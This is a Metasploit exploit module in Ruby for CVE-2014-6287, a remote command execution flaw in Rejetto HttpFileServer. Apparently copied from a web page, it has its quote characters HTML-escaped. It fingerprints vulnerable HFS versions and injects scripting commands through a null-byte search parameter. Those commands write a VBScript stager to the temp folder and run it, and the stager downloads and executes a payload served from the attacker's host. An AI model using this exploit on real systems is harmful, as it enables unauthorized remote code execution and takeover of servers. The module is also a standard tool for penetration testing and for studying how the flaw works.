# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Rejetto HttpFileServer Remote Command Execution",
      &#039;Description&#039;    => %q{
        Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a
        poor regex in the file ParserLib.pas. This module exploit the HFS scripting commands by
        using &#039;%00&#039; to bypass the filtering. This module has been tested successfully on HFS 2.3b
        over Windows XP SP3, Windows 7 SP1 and Windows 8.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Daniele Linguaglossa <danielelinguaglossa[at]gmail.com>&#039;, # orginal discovery
          &#039;Muhamad Fadzil Ramli <mind1355[at]gmail.com>&#039; # metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-6287&#039;],
          [&#039;OSVDB&#039;, &#039;111386&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/bugtraq/2014/Sep/85&#039;],
          [&#039;URL&#039;, &#039;http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands&#039;]
        ],
      &#039;Payload&#039;        => { &#039;BadChars&#039; => "\x0d\x0a\x00" },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;DisclosureDate&#039; => "Sep 11 2014",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path of the web application&#039;, &#039;/&#039;]),
          OptInt.new(&#039;HTTPDELAY&#039;,    [false, &#039;Seconds to wait before terminating web server&#039;, 10]),
        ], self.class)
  end

  def check
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/&#039;
    })

    if res &&  res.headers[&#039;Server&#039;] && res.headers[&#039;Server&#039;] =~ /HFS ([\d.]+)/
      version = $1
      if Gem::Version.new(version) <= Gem::Version.new("2.3")
        return Exploit::CheckCode::Detected
      else
        return Exploit::CheckCode::Safe
      end
    else
      return Exploit::CheckCode::Safe
    end
  end

  def on_request_uri(cli, req)
    print_status("#{peer} - Payload request received: #{req.uri}")
    exe = generate_payload_exe
    vbs = Msf::Util::EXE.to_exe_vbs(exe)
    send_response(cli, vbs, {&#039;Content-Type&#039; => &#039;application/octet-stream&#039;})
    # remove resource after serving 1st request as &#039;exec&#039; execute 4x
    # during exploitation
    remove_resource(get_resource)
  end

  def primer
    file_name = rand_text_alpha(rand(10)+5)
    file_ext = &#039;.vbs&#039;
    file_full_name = file_name + file_ext
    vbs_path = "%TEMP%\\#{file_full_name}"

    vbs_code = "Set x=CreateObject(\"Microsoft.XMLHTTP\")\x0d\x0a"
    vbs_code << "On Error Resume Next\x0d\x0a"
    vbs_code << "x.Open \"GET\",\"http://#{datastore[&#039;LHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}#{get_resource}\",False\x0d\x0a"
    vbs_code << "If Err.Number <> 0 Then\x0d\x0a"
    vbs_code << "wsh.exit\x0d\x0a"
    vbs_code << "End If\x0d\x0a"
    vbs_code << "x.Send\x0d\x0a"
    vbs_code << "Execute x.responseText"

    payloads = [
      "save|#{vbs_path}|#{vbs_code}",
      "exec|wscript.exe //B //NOLOGO #{vbs_path}"
    ]

    print_status("Sending a malicious request to #{target_uri.path}")
    payloads.each do |payload|
      send_request_raw({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => "/?search=%00{.#{URI::encode(payload)}.}"
      })
    end
    register_file_for_cleanup(vbs_path)
  end

  def exploit
    begin
      Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) { super }
    rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
    end
  end
end

